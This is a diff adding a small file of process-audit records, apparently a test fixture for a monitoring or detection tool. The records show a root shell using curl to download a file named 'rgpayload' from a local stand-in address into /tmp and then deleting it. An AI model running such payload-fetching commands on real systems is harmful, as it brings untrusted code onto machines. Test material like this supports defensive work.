@@ -1,0 +1,5 @@
+REDGAP	1	root	/root	/usr/bin/sleep	sleep infinity
+REDGAP	7	root	/root	/usr/bin/dash	sh -c curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl 2>/dev/null || true
+REDGAP	13	root	/root	/usr/bin/curl	curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl
+REDGAP	14	root	/root	/usr/bin/dash	sh -c rm -f /tmp/rgdl
+REDGAP	20	root	/root	/usr/bin/rm	rm -f /tmp/rgdl
